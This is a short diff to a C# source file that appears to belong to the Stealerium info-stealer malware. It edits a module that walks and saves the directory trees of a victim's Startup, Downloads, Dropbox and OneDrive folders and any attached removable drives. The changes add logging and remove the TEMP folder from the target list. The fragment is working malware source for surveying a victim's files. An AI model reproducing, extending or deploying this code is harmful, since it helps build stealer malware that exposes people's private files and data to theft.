@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Stealerium.Helpers;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -18,8 +19,7 @@ namespace Stealerium.Target.System
             Environment.GetFolderPath(Environment.SpecialFolder.Startup),
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
             Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
-            Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
-            Environment.GetEnvironmentVariable("TEMP")
+            Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive")
         };
 
         // Get directories tree
@@ -70,10 +70,12 @@ namespace Stealerium.Target.System
         // Save directories tree
         public static void SaveDirectories(string sSavePath)
         {
+            Logging.Log("Directoriy List >>");
             // Add USB, CD drives to directory structure
             foreach (var drive in DriveInfo.GetDrives())
                 if (drive.DriveType == DriveType.Removable && drive.IsReady)
                     TargetDirs.Add(drive.RootDirectory.FullName);
+
             // Create tasks
             foreach (var path in TargetDirs)
                 try
@@ -87,6 +89,7 @@ namespace Stealerium.Target.System
                 {
                     // ignored
                 }
+            Logging.Log("Directoriy Ended >>");
         }
     }
 }
